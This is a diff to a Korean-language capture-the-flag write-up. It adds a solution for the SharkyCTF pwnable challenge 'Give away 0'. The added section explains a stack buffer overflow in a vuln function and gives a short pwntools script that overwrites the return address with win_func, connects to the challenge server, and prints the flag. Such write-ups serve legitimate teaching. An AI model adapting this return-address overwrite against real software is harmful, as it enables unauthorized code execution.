@@ -15,6 +15,8 @@
 
 [Pwnable](#pwn-1)
 
+- [Give away 0](#give-away-0160)
+
 [Reversing](#rev-3)
 
 [Web](#web-3)
@@ -179,6 +181,34 @@ key는 `AZDNZ1234FED`이고, 이를 다음과 같이 wireshark preferences에 �
 > shkCTF{T4c4c5_ch4ll3n63_br0}
 
 ## Pwn (1)
+
+### Give away 0(160)
+
+바이너리 안에 main, vuln, win_func 함수가 있다.\
+main에서 vuln을 호출하고 vuln에서 fgets로 stdin에서 0x32만큼 읽는 구조이다.
+
+vuln에서 RET주소를 win_func주소로 덮으면 된다.
+
+32bit 바이너리인 줄 알았는데 64bit였다... 이것 때문에 잠깐 헤맸다.
+
+```py
+from pwn import *
+
+e = ELF("./0_give_away")
+p = remote("sharkyctf.xyz", 20333)
+
+win_addr = e.symbols['win_func']
+print(win_addr)
+
+code = "A" * 0x20
+code += "A" * 8  # SFP
+code += p64(win_addr)
+
+p.sendline(code)
+p.interactive()
+```
+
+> shkCTF{#Fr33_fL4g!!\_<3}
 
 ## Rev (3)
 
